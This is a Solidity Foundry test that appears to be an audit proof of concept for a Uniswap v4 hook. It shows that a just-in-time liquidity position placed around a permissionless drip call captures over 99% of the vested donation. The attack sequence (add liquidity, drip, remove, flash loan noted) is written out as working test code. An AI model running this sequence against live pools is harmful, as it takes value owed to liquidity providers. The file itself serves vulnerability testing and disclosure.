// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {console2} from "forge-std/console2.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {ModifyLiquidityParams} from "v4-core/types/PoolOperation.sol";
import {TouchstoneFixture} from "ts/test/utils/TouchstoneFixture.sol";
import {Record} from "ts/src/types/Record.sol";
import {Payout} from "ts/src/types/Payout.sol";
import {PoolState} from "ts/src/types/PoolState.sol";

/// A position that exists only for the block of a permissionless drip takes almost all of the
/// buffer released since the previous drip; vesting does not require it to stay in range.
contract JitDripTest is TouchstoneFixture {
    using StateLibrary for IPoolManager;

    address attacker = makeAddr("attacker");

    function setUp() public {
        _setUp(18, 6);
        _fund(attacker);
    }

    function test_JitAroundDripCapturesVestedValue() public {
        vm.roll(block.number + 1);
        vm.recordLogs();
        _swap(trader, true, true, 400_000 * 10 ** decQuote, "");
        (Record memory r,) = _lastRecord();
        uint64 t0 = uint64(r.timestamp) + 3;
        vm.warp(t0);
        bytes[] memory u = _updateRaw(3_400e8, t0, t0 - 1, 0);
        vm.prank(keeper, keeper);
        Payout memory p = settler.settle(r, u);
        console2.log("toLPs (deposit currency)", p.toLPs, "depositIn0", r.depositIn0);

        // Nobody drips for one vesting period.
        vm.warp(block.timestamp + 30 minutes);

        (, int24 tick,,) = manager.getSlot0(id);
        int24 lower = (tick / TICK_SPACING) * TICK_SPACING;
        ModifyLiquidityParams memory lp = ModifyLiquidityParams({
            tickLower: lower - TICK_SPACING, tickUpper: lower + 2 * TICK_SPACING,
            liquidityDelta: int256(uint256(liquidity()) * 400), salt: bytes32("jit")
        });
        uint256 b0 = _balance(key.currency0, attacker);
        uint256 b1 = _balance(key.currency1, attacker);
        // add -> drip -> remove; one tx with a flash loan in practice, three calls here.
        vm.prank(attacker, attacker);
        lpRouter.modifyLiquidity(key, lp, "");
        vm.prank(attacker, attacker);
        (uint256 a0, uint256 a1) = hook.drip(key);
        lp.liquidityDelta = -lp.liquidityDelta;
        vm.prank(attacker, attacker);
        lpRouter.modifyLiquidity(key, lp, "");
        int256 g0 = int256(_balance(key.currency0, attacker)) - int256(b0);
        int256 g1 = int256(_balance(key.currency1, attacker)) - int256(b1);
        console2.log("donated", a0, a1);
        console2.logInt(g0);
        console2.logInt(g1);
        assertEq(a0, 0);
        assertGe(g0, -2);
        assertGt(uint256(g1) * 100, a1 * 99, "JIT took > 99% of the donation");
    }
}
